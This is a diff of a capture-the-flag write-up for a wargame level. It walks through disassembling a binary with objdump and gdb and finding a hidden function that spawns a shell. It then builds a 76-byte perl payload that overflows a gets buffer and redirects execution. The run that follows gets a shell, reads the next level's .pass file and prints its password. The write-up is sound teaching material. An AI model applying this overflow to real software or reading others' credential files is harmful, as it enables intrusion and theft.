@@ -1,10 +1,46 @@
+1. Using `objdump -d level1` we can see that the binary calls `system` and `gets`. It sounds good for a buffer overflow exploit...
 
+2. Digging deeper with gdb, we can easily see that `system("/bin/sh")` is called in the `run` function (which is never called).
 
-perl -e 'print "a"x76 . "\x44\x84\x04\x08"' > /tmp/hack_very_hard
+    gdb> layout asm     # to see a god damn thing.
+        ...
+        | 0x8048472 <run+46>              movl   $0x8048584,(%esp)
+        | 0x8048479 <run+53>              call   0x8048360 <system@plt>
+        ...
+    gdb> x/s 0x8048584  # address given to `system` argument
 
-cat /tmp/hack_very_hard - | ./level1
+3. Also, in the main we see that 80 bytes are reserved to call `gets`.
+        ...
+        | 0x8048486 <main+6>              sub    $0x50,%esp     # extending the stack 80 bytes
+        | 0x8048489 <main+9>              lea    0x10(%esp),%eax
+        | 0x804848d <main+13>             mov    %eax,(%esp)
+        | 0x8048490 <main+16>             call   0x8048340 <gets@plt> 
+        ...
 
-    > whoami
-    level2
-    > cat /home/user/level2/.pass
-    53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+4. We can deduce the size of the buffer by substracting 4 bytes which will be used to store the next instruction address.
+So the size of the buffer is 76 bytes.
+
+5. We can verify by typing 76 bytes into stdin : it segfaults. It doesn't for 75 bytes.
+What this means is that when we write over 75 bytes, we actually overwrite the address of the next instruction to call.
+By carefully choosing what we type, we can choose the address of the secret `run` function and call system.
+
+6. Creating the payload :
+        ...
+        | 0x8048444 <run>                 push   %ebp       # We will write this address.
+        | 0x8048445 <run+1>               mov    %esp,%ebp
+        | 0x8048447 <run+3>               sub    $0x18,%esp
+        | 0x804844a <run+6>               mov    0x80497c0,%eax
+        ...
+
+        The payload : The address is backward because we are in little endian.
+
+        $> perl -e 'print "a"x76 . "\x44\x84\x04\x08"' > /tmp/hack_very_hard
+
+7. The exploit :
+
+        $> cat /tmp/hack_very_hard - | ./level1
+            Good... Wait, what ?
+            > whoami
+            level2
+            > cat /home/user/level2/.pass
+            53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
